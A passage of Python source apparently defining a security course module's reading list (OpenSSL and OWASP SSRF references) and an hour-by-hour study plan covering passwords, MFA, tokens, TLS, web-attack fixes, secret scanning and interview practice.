        dict(title="OpenSSL documentation: s_client, s_server, x509", url="https://docs.openssl.org/master/man1/", use="The commands used in the TLS lesson", license="Apache 2.0; read online", how="Link only"),
        dict(title="OWASP: Server-Side Request Forgery Prevention Cheat Sheet", url="https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html", use="SSRF controls", license="CC BY-SA; read online", how="Link only"),
    ],
    plan=[
        "**Hours 1 to 2:** passwords and MFA: change the dictionary and the scrypt parameters and explain each result; verify the TOTP test vectors.",
        "**Hours 3 to 4:** tokens: add an expiry-skew tolerance and an audience check of your own to the verifier; then the token-check lab.",
        "**Hours 5 to 6:** TLS: build the CA and server certificate, break each handshake on purpose, then try mTLS.",
        "**Hours 7 to 8:** web attacks: fix the vulnerable handlers, then add a new attack string and show the safe version resists it; then the log-attack-read lab.",
        "**Hour 9:** secrets and keys: re-run the history scan on another repository of your own; rotate the master key twice.",
        "**Hours 10 and 11:** say each interview scenario aloud for two minutes, timed, and compare with the written answer.",
    ],
)
